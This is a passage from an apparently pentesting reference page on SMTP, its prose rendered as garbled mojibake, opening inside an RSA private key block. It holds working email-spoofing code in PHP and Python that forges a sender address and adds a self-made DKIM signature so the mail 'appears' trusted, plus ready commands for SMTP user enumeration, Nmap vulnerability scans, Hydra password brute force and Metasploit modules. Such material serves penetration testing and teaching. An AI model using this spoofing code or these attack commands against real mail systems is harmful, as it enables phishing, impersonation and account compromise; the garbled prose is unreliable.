fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**рдпрд╛ рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># рдпрд╣ рдПрдХ рдЕрд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдЧрд╛
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**

**рдЗрди рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **рдЕрдиреНрдп рдлрд╝рд┐рд╢рд┐рдВрдЧ рд╕рдВрдХреЗрдд**

* рдбреЛрдореЗрди рдХреА рдЖрдпреБ
* IP рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд▓рд┐рдВрдХ
* рд▓рд┐рдВрдХ рд╣реЗрд░рдлреЗрд░ рддрдХрдиреАрдХреЗрдВ
* рд╕рдВрджрд┐рдЧреНрдз (рдЕрд╕рд╛рдорд╛рдиреНрдп) рдЕрдЯреИрдЪрдореЗрдВрдЯреНрд╕
* рдЯреВрдЯреА рд╣реБрдИ рдИрдореЗрд▓ рд╕рд╛рдордЧреНрд░реА
* рдореЗрд▓ рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╡рд┐рдкрд░реАрдд рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП рдорд╛рди
* рдорд╛рдиреНрдп рдФрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп SSL рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрд╕реНрддрд┐рддреНрд╡
* рд╡реЗрдм рд╕рд╛рдордЧреНрд░реА рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдкреГрд╖реНрда рдХрд╛ рд╕рдмрдорд┐рд╢рди

## SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдЪреЛрд░реА

**рдпрджрд┐ рдЖрдк SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** [**рдпрд╣ рдкрдврд╝реЗрдВ**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓

### Postfix

рдЖрдорддреМрд░ рдкрд░, рдпрджрд┐ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ `/etc/postfix/master.cf` рдореЗрдВ **рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рд╣реЛрддреА рд╣реИрдВ, рдЬрдм рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдореЗрд▓ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд▓рд╛рдЗрди `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ `/etc/postfix/filtering` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреА рдЕрдЧрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдирдпрд╛ рдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

рдЕрдиреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ:
```
sendmail.cf
submit.cf
```
## HackTricks рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЖрджреЗрд╢
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**рддрддреНрдХрд╛рд▓ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк рд╡рд▓реНрдиреЗрд░реЗрдмрд┐рд▓рд┐рдЯреА рдЕрд╕реЗрд╕рдореЗрдВрдЯ рдФрд░ рдкреЗрдирдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП**ред рдХрд╣реАрдВ рд╕реЗ рднреА 20+ рдЯреВрд▓реНрд╕ рдФрд░ рдлреАрдЪрд░реНрд╕ рдХреЗ рд╕рд╛рде рдкреВрд░рд╛ рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рд░реЗрдХреЙрди рд╕реЗ рд▓реЗрдХрд░ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреА рдЬрдЧрд╣ рдирд╣реАрдВ рд▓реЗрддреЗ - рд╣рдо рдХрд╕реНрдЯрдо рдЯреВрд▓реНрд╕, рдбрд┐рдЯреЗрдХреНрд╢рди рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдореЙрдбреНрдпреВрд▓реНрд╕ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЦреЛрдЬрдиреЗ, рдкреЙрдк рд╢реЗрд▓реНрд╕ рдФрд░ рдордЬреЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рдорд┐рд▓ рд╕рдХреЗред

{% embed url="https://pentest-tools.com/" %}
<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**ред
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬ рдореЗрдВред

</details>
